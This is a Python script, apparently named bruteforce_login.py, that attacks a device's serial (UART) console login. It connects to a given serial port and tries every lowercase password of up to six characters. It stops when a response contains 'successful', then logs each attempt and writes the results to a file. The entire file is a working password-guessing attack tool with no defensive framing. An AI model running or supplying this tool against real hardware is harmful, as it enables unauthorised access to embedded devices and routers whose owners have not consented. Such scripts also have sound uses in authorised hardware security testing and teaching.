#!/usr/bin/env python3
import serial
import time
import string
import sys
from itertools import product

class UARTBruteforcer:
    def __init__(self, port='/dev/serial0', baud=115200):
        self.port = port
        self.baud = baud
        self.ser = None
        self.results = []
        self.attempts = 0
        self.start_time = None

    def connect(self):
        try:
            self.ser = serial.Serial(
                port=self.port,
                baudrate=self.baud,
                timeout=1
            )
            print(f"[+] Connected to {self.port}")
            return True
        except Exception as e:
            print(f"[-] Connection error: {e}")
            return False

    def disconnect(self):
        if self.ser and self.ser.is_open:
            self.ser.close()
            print("[+] Disconnected")

    def send_input(self, data):
        if not self.ser:
            return None
        try:
            self.ser.write(data.encode() + b'\r\n')
            time.sleep(0.1)  # Wait for response
            response = self.ser.read_until(b'\r\n').decode().strip()
            self.attempts += 1
            return response
        except Exception as e:
            print(f"[-] Error sending data: {e}")
            return None

    def bruteforce(self, max_length=6):
        print("\n[*] Starting bruteforce attack...")
        self.start_time = time.time()
        
        # Try all lowercase combinations up to max_length
        for length in range(1, max_length + 1):
            print(f"\n[*] Trying {length} character combinations...")
            for combo in product(string.ascii_lowercase, repeat=length):
                test = ''.join(combo)
                response = self.send_input(test)
                
                # Print progress every 100 attempts
                if self.attempts % 100 == 0:
                    elapsed = time.time() - self.start_time
                    print(f"[*] Attempts: {self.attempts}, Current: {test}, Time: {elapsed:.1f}s")
                
                # Check for successful login
                if "successful" in response.lower():
                    elapsed = time.time() - self.start_time
                    print(f"\n[+] Password found: {test}")
                    print(f"[+] Attempts: {self.attempts}")
                    print(f"[+] Time taken: {elapsed:.1f} seconds")
                    return test
                
                self.results.append(f"Attempt {self.attempts}: {test} - {response}")

    def save_results(self, filename="bruteforce_results.txt"):
        with open(filename, 'w') as f:
            f.write("UART Bruteforce Results\n")
            f.write("======================\n\n")
            f.write(f"Total attempts: {self.attempts}\n")
            f.write(f"Time taken: {time.time() - self.start_time:.1f} seconds\n\n")
            for result in self.results:
                f.write(result + "\n")
        print(f"\n[+] Results saved to {filename}")

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 bruteforce_login.py <serial_port>")
        print("Example: python3 bruteforce_login.py /dev/serial0")
        sys.exit(1)

    port = sys.argv[1]
    bruteforcer = UARTBruteforcer(port=port)

    if not bruteforcer.connect():
        sys.exit(1)

    try:
        # Wait for login prompt
        time.sleep(2)
        
        # Start bruteforce attack
        password = bruteforcer.bruteforce()
        
        # Save results
        bruteforcer.save_results()

    except KeyboardInterrupt:
        print("\n[!] Bruteforce interrupted by user")
        bruteforcer.save_results()
    finally:
        bruteforcer.disconnect()

if __name__ == "__main__":
    main() 